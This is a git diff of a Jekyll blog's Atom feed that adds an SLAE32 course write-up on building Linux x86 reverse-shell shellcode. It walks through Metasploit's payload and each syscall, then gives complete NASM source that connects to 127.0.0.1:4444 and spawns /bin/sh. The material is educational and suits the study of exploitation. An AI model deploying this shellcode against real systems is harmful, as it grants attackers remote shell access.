@@ -1,36 +1,333 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-09-25T14:18:49+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Jeremy Catelain</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</subtitle><entry><title type="html">ze</title><link href="http://localhost:4000/2022/09/14/welcome-to-jekyll.html" rel="alternate" type="text/html" title="ze" /><published>2022-09-14T08:45:58+02:00</published><updated>2022-09-14T08:45:58+02:00</updated><id>http://localhost:4000/2022/09/14/welcome-to-jekyll</id><content type="html" xml:base="http://localhost:4000/2022/09/14/welcome-to-jekyll.html">&lt;p&gt;You’ll find this post in your &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_posts&lt;/code&gt; directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jekyll serve&lt;/code&gt;, which launches a web server and auto-regenerates your site when a file is updated.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-09-26T08:43:59+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Jeremy Catelain</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</subtitle><entry><title type="html">SLAE32</title><link href="http://localhost:4000/slae32/2022/09/25/Assign2-Rev.html" rel="alternate" type="text/html" title="SLAE32" /><published>2022-09-25T08:45:58+02:00</published><updated>2022-09-25T08:45:58+02:00</updated><id>http://localhost:4000/slae32/2022/09/25/Assign2-Rev</id><content type="html" xml:base="http://localhost:4000/slae32/2022/09/25/Assign2-Rev.html">&lt;h3 id=&quot;-description-of-the-assignment-&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt; Description of the assignment &lt;/span&gt;&lt;/h3&gt;
 
-&lt;p&gt;Jekyll requires blog post files to be named according to the following format:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Create a Shell_Reverse_TCP Shellcode:
+    &lt;ul&gt;
+      &lt;li&gt;Reverse connects to configured IP and Port;&lt;/li&gt;
+      &lt;li&gt;Execs Shell on sucessfull connection;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;IP and Port should be easily configurable.&lt;/li&gt;
+&lt;/ul&gt;
 
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;YEAR-MONTH-DAY-title.MARKUP&lt;/code&gt;&lt;/p&gt;
+&lt;!--more--&gt;
 
-&lt;p&gt;Where &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;YEAR&lt;/code&gt; is a four-digit number, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MONTH&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DAY&lt;/code&gt; are both two-digit numbers, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MARKUP&lt;/code&gt; is the file extension representing the format used in the file. After that, include the necessary front matter. Take a look at the source for this post to get an idea about how it works.&lt;/p&gt;
+&lt;h3 id=&quot;-msfvenom-example--socket_call-&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt; MSFVenom example &amp;amp; Socket_call &lt;/span&gt;&lt;/h3&gt;
 
-&lt;p&gt;Jekyll also offers powerful support for code snippets:&lt;/p&gt;
+&lt;p&gt;To perform this exercise, we started by analysing the reverse shell code of Metasploit to see how it works and what syscall are made. To do so, we followed the steps as follows to create an image of the different syscalls performed and to make it more visible.&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-  &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Hi, &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;Tom&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;c1&quot;&gt;#=&amp;gt; prints &apos;Hi, Tom&apos; to STDOUT.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;p&gt;As follows the command line to generate the graphical schema of the metasploit reverse shell :&lt;/p&gt;
 
-&lt;p&gt;Check out the &lt;a href=&quot;https://jekyllrb.com/docs/home&quot;&gt;Jekyll docs&lt;/a&gt; for more info on how to get the most out of Jekyll. File all bugs/feature requests at &lt;a href=&quot;https://github.com/jekyll/jekyll&quot;&gt;Jekyll’s GitHub repo&lt;/a&gt;. If you have questions, you can ask them on &lt;a href=&quot;https://talk.jekyllrb.com/&quot;&gt;Jekyll Talk&lt;/a&gt;.&lt;/p&gt;</content><author><name></name></author><summary type="html">You’ll find this post in your _posts directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run jekyll serve, which launches a web server and auto-regenerates your site when a file is updated.</summary></entry><entry><title type="html">SLAE32</title><link href="http://localhost:4000/slae32/slae32$/2022/09/14/REV.html" rel="alternate" type="text/html" title="SLAE32" /><published>2022-09-14T08:45:58+02:00</published><updated>2022-09-14T08:45:58+02:00</updated><id>http://localhost:4000/slae32/slae32$/2022/09/14/REV</id><content type="html" xml:base="http://localhost:4000/slae32/slae32$/2022/09/14/REV.html">&lt;p&gt;You’ll find this post in your &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_posts&lt;/code&gt; directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jekyll serve&lt;/code&gt;, which launches a web server and auto-regenerates your site when a file is updated.&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -p linux/x86/shell_reverse_tcp R | /opt/hackingtools/libemu/tools/sctest/sctest -vvv -Ss 100000 -G shell_reverse_tcp.dot
 
-&lt;p&gt;Jekyll requires blog post files to be named according to the following format:&lt;/p&gt;
+Then convert into PNG file :
 
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;YEAR-MONTH-DAY-title.MARKUP&lt;/code&gt;&lt;/p&gt;
+dot shell_reverse_tcp.dot -Tpng -o shell_reverse_tcp.png 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Where &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;YEAR&lt;/code&gt; is a four-digit number, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MONTH&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DAY&lt;/code&gt; are both two-digit numbers, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MARKUP&lt;/code&gt; is the file extension representing the format used in the file. After that, include the necessary front matter. Take a look at the source for this post to get an idea about how it works.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Result:&lt;/strong&gt;&lt;/p&gt;
 
-&lt;p&gt;Jekyll also offers powerful support for code snippets:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment2/assignment2.1.png&quot; alt=&quot;drawing&quot; style=&quot;max-width:100%;&quot; /&gt;&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-  &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Hi, &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;Tom&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;c1&quot;&gt;#=&amp;gt; prints &apos;Hi, Tom&apos; to STDOUT.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;p&gt;As we can see, there are 4 syscalls :&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;socket&lt;/li&gt;
+  &lt;li&gt;dup2&lt;/li&gt;
+  &lt;li&gt;connect&lt;/li&gt;
+  &lt;li&gt;execve&lt;/li&gt;
+&lt;/ul&gt;
 
-&lt;p&gt;Check out the &lt;a href=&quot;https://jekyllrb.com/docs/home&quot;&gt;Jekyll docs&lt;/a&gt; for more info on how to get the most out of Jekyll. File all bugs/feature requests at &lt;a href=&quot;https://github.com/jekyll/jekyll&quot;&gt;Jekyll’s GitHub repo&lt;/a&gt;. If you have questions, you can ask them on &lt;a href=&quot;https://talk.jekyllrb.com/&quot;&gt;Jekyll Talk&lt;/a&gt;.&lt;/p&gt;</content><author><name></name></author><category term="SLAE32$" /><summary type="html">You’ll find this post in your _posts directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run jekyll serve, which launches a web server and auto-regenerates your site when a file is updated.</summary></entry><entry><title type="html">SLAE32</title><link href="http://localhost:4000/slae32/2022/09/14/Bind.html" rel="alternate" type="text/html" title="SLAE32" /><published>2022-09-14T08:45:58+02:00</published><updated>2022-09-14T08:45:58+02:00</updated><id>http://localhost:4000/slae32/2022/09/14/Bind</id><content type="html" xml:base="http://localhost:4000/slae32/2022/09/14/Bind.html">&lt;h3 id=&quot;-description-of-the-assignment-&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt; Description of the assignment &lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;Each of them will be detailled in the following parts.&lt;/p&gt;
+
+&lt;h2 id=&quot;socket-call&quot;&gt;SOCKET CALL&lt;/h2&gt;
+
+&lt;p&gt;The detail of the socket call can be displayed with the following command line :&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# cat /usr/include/x86_64-linux-gnu/asm/unistd_32.h | grep socket
+    #define __NR_socketcall 102
+    #define __NR_socket 359
+    #define __NR_socketpair 360
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Then, we looked into the details of the socketcall&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assignment2-img/assignment2.2.png&quot; alt=&quot;Picture&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As we can see, the socketcall is composed of first, the type of the syscall (socket, bind, …) and secondly its arguments.&lt;/p&gt;
+
+&lt;h2 id=&quot;socket&quot;&gt;SOCKET&lt;/h2&gt;
+
+&lt;p&gt;The socket syscall creates a socket which will listen for the incoming connections. It needs the following parameters as follows :&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;man 2 socket 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;assignment2-img/assignment2.4.png&quot; alt=&quot;Picture&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Return value :
+&lt;img src=&quot;assignment2-img/assignment2.5.png&quot; alt=&quot;Picture&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;with :&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;domain : The protocol family used (AF_INET, AF_LOCAL, …)&lt;/li&gt;
+  &lt;li&gt;type : The type of the service (TCP, UDP, …)&lt;/li&gt;
+  &lt;li&gt;protocol : Specify if a particular protocol will be used with the socket (0 most of the time)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;And the corresponding parameter values are listed in the files as follows :&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;DOMAIN AND PROTOCOLS parameters : 
+/usr/include/x86_64-linux-gnu/bits/socket.h
+
+TYPE parameter :
+/usr/include/bits/socket_type.h
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The following parameters were use by the msfvenom bind shellcode shows :&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;ESP : 00000002 00000001 00000000&lt;/li&gt;
+  &lt;li&gt;EAX : 0x66                                // in decimal 102 (syscall)&lt;/li&gt;
+  &lt;li&gt;EBX : 1                                   // socket call&lt;/li&gt;
+  &lt;li&gt;ECX : ESP :  00000002 00000001 00000000   // arg of the socket call&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;The argument passed throught ECX are :&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;domain : 2      // PF_INET/AF_INET, IP protocol family&lt;/li&gt;
+  &lt;li&gt;type : 1        // SOCK_STREAM, TCP connection based&lt;/li&gt;
+  &lt;li&gt;protocol : 0    // Unspecified&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;Useful link :&lt;/strong&gt; The details of the &lt;em&gt;socket&lt;/em&gt; can be find in the following links :&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;http://shtroumbiniouf.free.fr/CoursInfo/Reseau2/Cours/SocketsBSD/SocketsBSD.html ()&lt;/li&gt;
+  &lt;li&gt;http://sdz.tdct.org/sdz/les-sockets.html&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;dup2&quot;&gt;DUP2&lt;/h2&gt;
+
+&lt;p&gt;Now, we need to redirect all the file descriptors to the client scoketfd generated by the previous socket syscall.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assignment2-img/assignment2.6.png&quot; alt=&quot;Picture&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assignment2-img/assignment2.7.png&quot; alt=&quot;Picture&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We will pass the following arguments :&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;EAX : 0x3f        // dup sys call&lt;/li&gt;
+  &lt;li&gt;EBX : Previous EAX         // File descriptor returned by the accept call&lt;/li&gt;
+  &lt;li&gt;ECX : 2 to 0 (loop)      // IN, OUT, ERR&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;To perform the loop, we will use the intruction JNS as follows because it perform the jmp until the Sign Flag is set (SF=1), which mean that the zero is taken into account in the loop :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assignment2-img/assignment2.8.png&quot; alt=&quot;Picture&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;When we execute the code, we can see that the shellcode is listening.
+&lt;img src=&quot;assignment2-img/assignment2.9.png&quot; alt=&quot;Picture&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;connect&quot;&gt;CONNECT&lt;/h2&gt;
+
+&lt;p&gt;Then, we need to intiate a socket connection on a remote host by specifing the address and the port to connect to.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;man 2 connect
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;assignment2-img/assignment2.10.png&quot; alt=&quot;Picture&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;With :&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;sockfd : file descriptor, return value of the socket sys call&lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;sockaddr *addr // address argument which depends on the family&lt;/p&gt;
+
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  struct sockaddr {
+      sa_family_t sa_family;
+      char        sa_data[14];
+  }
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+
+    &lt;p&gt;In our case, with the Internet Family AF_INET, the address structure will be constructed as follows :&lt;/p&gt;
+
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  struct sockaddr_in {
+      sa_family_t    sin_family; /* address family: AF_INET */
+      in_port_t      sin_port;   /* port in network byte order */
+      struct in_addr sin_addr;   /* internet address */
+  };
+
+  /* Internet address. */
+  struct in_addr {
+      uint32_t       s_addr;     /* address in network byte order */
+  };
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+
+    &lt;p&gt;From :&lt;/p&gt;
+
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  /usr/src/linux-headers-5.2.0-kali2-common/include/uapi/linux/in.h
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;addrlen : The size, in bytes, of the address structure pointed to by addr which is 16&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Link:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;IP manual : https://man7.org/linux/man-pages/man7/ip.7.html&lt;/li&gt;
+  &lt;li&gt;Example : https://www.scip.ch/en/?labs.20200521&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Which mean that we need to pass the following registers :&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;EAX : 0x66    // SOCKET_CALL&lt;/li&gt;
+  &lt;li&gt;EBX : 3       // SYS_CONNECT&lt;/li&gt;
+  &lt;li&gt;ECX :
+    &lt;ul&gt;
+      &lt;li&gt;ESI         // file descriptor which is the return value of the socket syscall&lt;/li&gt;
+      &lt;li&gt;Struct :
+        &lt;ul&gt;
+          &lt;li&gt;AF_INET : 2 // Family   (2 bytes)&lt;/li&gt;
+          &lt;li&gt;The port : 4444 // 0x115c in hexa (6 bytes)&lt;/li&gt;
+          &lt;li&gt;IP : 0.0.0.0 // push 00 on the stack (8 bytes)&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;addrlen : 16 bytes&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;While i was checking that the return value is NULL (0x00) i set up a netcat to verify that the connection succeed.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assignment2-img/assignment2.11.png&quot; alt=&quot;Picture&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;execve&quot;&gt;EXECVE&lt;/h2&gt;
+
+&lt;p&gt;Now that we created a socket which connect to a remote host, we finally have to launch a shell through that connection allowing the remote host to interact with the device.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assignment2-img/assignment2.12.png&quot; alt=&quot;Picture&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We will pass the following arguments :&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;EAX : 0xb                             // execve syscall, 11 in decimal&lt;/li&gt;
+  &lt;li&gt;EBX : Argument /bin//sh + 0X00000000&lt;/li&gt;
+  &lt;li&gt;ECX : Address of the EBX string&lt;/li&gt;
+  &lt;li&gt;EDX : NULL&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;code&quot;&gt;CODE&lt;/h2&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;; Filename: ShellReverse.nasm
+; Author: Codor
+
+global _start
+
+section .text
+_start:
+    
+    ; SOCKET
+    
+    ; EBX
+    push ebx ; push the x00000000 on the stack
+    
+    inc ebx ; SYS_SOCKET = 1
+    push ebx ; push the 0x00000001 on the stack for the domain AF_INET of the SYS_SOCKET call 
+    
+    ; ECX
+    push byte 0x2 ; push the 0x00000002 on the stack for the type SOCK_STREAM
+    mov ecx, esp ; put the arguments of the socketcall into ECX
+
+    ; EDX is 0x00000000 by default
+
+    ; EAX
+    mov al, 0x66
+
+    ; socket call
+    int 0x80
+    
+    mov esi, eax
+    
+    ; DUP
+    ; EBX, File descriptor return by ACCEPT call
+    mov ebx, eax	; Retrieve the file descriptor
+    
+    ; EAX, dup2 sys call 0x3f
+    xor eax, eax
+    
+    ; initialize ECX 
+    xor ecx, ecx
+    mov cl, 0x2
+
+    ; LOOP
+DupLoop :
+    
+    mov al, 0x3f
+    int 0x80
+    dec ecx
+    jns DupLoop	
+
+
+    ; CONNECT
+    ; EBX ; SYS_CONNECT = 3
+    xor ebx, ebx
+    mov bl, 3
+
+    ; ECX, To modify
+    ; Creation of the struct sockaddr_in
+    
+    ; //////////////// Listening address ////////////
+    ; Description: Set up the address to listen to
+    ; Example : 
+    ; 	push edi ; Push on the stack the address 0.0.0.0
+    ; 	push 0x00000000 ; Same
+    push 0x0100007f ; 127.0.0.1
+
+    ; /////////////// Listening port ///////////////
+    ; Description : Set up the port to listen to
+    ; Example : push word 0x5c11 ; Push on the stack the port 4444
+    push word 0x5c11	
+    
+    push word 0x2 ; Push the Family AF_INET = 2
+    mov ecx, esp ; mov the structure into ecx
+    
+    ; put all parameters into ECX 
+        
+    push byte 0x16 ; Push on the stack the address length of 16
+    push ecx
+    push esi ; push the file descriptor
+    mov ecx, esp ; Move the stack into ECX
+    
+    ; EAX
+    xor eax, eax
+    mov al, 0x66
+    
+    ; connect call
+    int 0x80
+    
+
+
+    ; EXECVE /bin/sh	
+    ; Push the 0x00000000 on the stack
+    xor eax, eax
+    push eax
+    
+    ; put the string on the stack
+    push 0x68732f2f ; //sh : hs// : 68732f2f	
+    push 0x6e69622f ; /bin : nib/ : 6e69622f	
+    
+    ; setup EBX with the value of ESP
+    mov ebx, esp
+
+    ; set up EDX and push null bytes again
+    push eax
+    mov edx, esp
+
+    ; set up ECX argv address on the first dw and null in second dw
+    push ebx 
+    ; Then move the top of the stack into ECX
+    mov ecx, esp
+
+    ; EAX
+    mov al, 0xb
+    int 0x80
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="SLAE32" /><summary type="html">Description of the assignment Create a Shell_Reverse_TCP Shellcode: Reverse connects to configured IP and Port; Execs Shell on sucessfull connection; IP and Port should be easily configurable.</summary></entry><entry><title type="html">SLAE32</title><link href="http://localhost:4000/slae32/2022/09/14/Assign1-Bind.html" rel="alternate" type="text/html" title="SLAE32" /><published>2022-09-14T08:45:58+02:00</published><updated>2022-09-14T08:45:58+02:00</updated><id>http://localhost:4000/slae32/2022/09/14/Assign1-Bind</id><content type="html" xml:base="http://localhost:4000/slae32/2022/09/14/Assign1-Bind.html">&lt;h3 id=&quot;-description-of-the-assignment-&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt; Description of the assignment &lt;/span&gt;&lt;/h3&gt;
 
 &lt;ul&gt;
   &lt;li&gt;Create a Shell_Bind_TCP Shellcode:
@@ -449,4 +746,20 @@ echo &apos;[+] Done!&apos;
 
 &lt;p&gt;And finally, we launch the bind shellcode and connect to it with the netcat tool.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment1/assess1-result.PNG&quot; alt=&quot;drawing&quot; style=&quot;max-width:100%;&quot; /&gt;&lt;/p&gt;</content><author><name></name></author><category term="SLAE32" /><summary type="html">Description of the assignment Create a Shell_Bind_TCP Shellcode: Binds to a port; Execs Shell on incoming connection; Port should be easily configurable.</summary></entry></feed>
+&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment1/assess1-result.PNG&quot; alt=&quot;drawing&quot; style=&quot;max-width:100%;&quot; /&gt;&lt;/p&gt;</content><author><name></name></author><category term="SLAE32" /><summary type="html">Description of the assignment Create a Shell_Bind_TCP Shellcode: Binds to a port; Execs Shell on incoming connection; Port should be easily configurable.</summary></entry><entry><title type="html">ze</title><link href="http://localhost:4000/2022/09/14/welcome-to-jekyll.html" rel="alternate" type="text/html" title="ze" /><published>2022-09-14T08:45:58+02:00</published><updated>2022-09-14T08:45:58+02:00</updated><id>http://localhost:4000/2022/09/14/welcome-to-jekyll</id><content type="html" xml:base="http://localhost:4000/2022/09/14/welcome-to-jekyll.html">&lt;p&gt;You’ll find this post in your &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_posts&lt;/code&gt; directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jekyll serve&lt;/code&gt;, which launches a web server and auto-regenerates your site when a file is updated.&lt;/p&gt;
+
+&lt;p&gt;Jekyll requires blog post files to be named according to the following format:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;YEAR-MONTH-DAY-title.MARKUP&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Where &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;YEAR&lt;/code&gt; is a four-digit number, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MONTH&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DAY&lt;/code&gt; are both two-digit numbers, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MARKUP&lt;/code&gt; is the file extension representing the format used in the file. After that, include the necessary front matter. Take a look at the source for this post to get an idea about how it works.&lt;/p&gt;
+
+&lt;p&gt;Jekyll also offers powerful support for code snippets:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Hi, &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;Tom&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;#=&amp;gt; prints &apos;Hi, Tom&apos; to STDOUT.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
